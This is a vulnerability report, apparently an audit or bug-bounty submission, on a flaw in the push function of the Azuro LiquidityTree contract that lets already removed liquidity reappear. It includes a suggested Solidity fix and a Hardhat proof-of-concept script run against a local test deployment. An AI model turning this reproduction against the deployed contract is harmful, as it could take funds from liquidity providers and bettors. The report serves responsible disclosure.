
## Bug Description

There is a bug in the `LiquidityTree` superclass of `LP`. The `push` function does not push changes down to all leaves correctly in certain circumstances. This can cause already removed liquidity to reappear.

The bug is present in the deployed code to the gnosis chain, located here:
https://gnosisscan.io/address/0x6d139bf82e6ff731cc0209349dd41b7feb5cf635#code

For demonstrational purposes I'm using the LiquidityTree Github repository as this is easier to work with.
https://github.com/Azuro-protocol/LiquidityTree

The bug is present in both codebases.

See the Proof of Concept for a concrete example of the bug.

## Impact
This bug can cause already removed liquidity to reappear, leading to an unfair distribution of assets and/or profit of liquidity providers and/or bettors.

## Recommendation
The `push` function returns in case both child nodes have zero amount:
```solidity
if (sumAmounts == 0) return;
```
https://github.com/Azuro-protocol/LiquidityTree/blob/main/contracts/LiquidityTree.sol#L368

This causes problems if the layer below the current child layer contains nonzero values that need to be updated.

A simple fix would be something like the following:
```solidity
uint128 setLAmount;
uint128 setRAmount;
if (sumAmounts != 0) {
    setLAmount = uint128((amount * lAmount) / sumAmounts);
    setRAmount = amount - setLAmount;
} else {
    setLAmount = 0;
    setRAmount = 0;
}

// update left and right child
setAmount(lChild, setLAmount, updateId_);
setAmount(rChild, setRAmount, updateId_);
```

I'm sure there are more elegant and gas-efficient solutions. This code passes the current testsuite and fixes the bug.

## Proof of Concept
```javascript
const hre = require("hardhat");
const ethers = hre.ethers;

async function main() {
  let amount;

  // Create a small tree with 8 leaves to keep things simple
  const LiquidityTree = await ethers.getContractFactory("LiquidityTree");
  const tree = await LiquidityTree.deploy(8);
  await tree.deployed();

  // Add three leaves so the one we will be using is the last of the left "main branch"
  await tree.nodeAddLiquidity(0);
  await tree.nodeWithdraw(8);
  await tree.nodeAddLiquidity(0);
  await tree.nodeWithdraw(9);
  await tree.nodeAddLiquidity(0);
  await tree.nodeWithdraw(10);

  // Add liquidity to the node to be tested
  await tree.nodeAddLiquidity(42); // 42 is arbitrary

  // Remove all current liquidity from the tree
  await tree.remove(42);

  // Add another node so 'tree.updateId' propagates back to the root when we do a push
  await tree.nodeAddLiquidity(0);
  await tree.nodeWithdraw(12);

  // Print the node amount. This is 0 as we expect.
  amount = await tree.nodeWithdrawView(11);
  console.log("amount before:", amount.toString());

  // Withdraw 0 percent, this should do nothing.
  await tree.nodeWithdrawPercent(11, 0);

  // Print the node amount. Now it is 42.
  amount = await tree.nodeWithdrawView(11);
  console.log("amount after:", amount.toString());

  // Script output:
  //
  // $ yarn hardhat run scripts/poc-pushbug.js
  // amount before: 0
  // amount after: 42
  //
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

```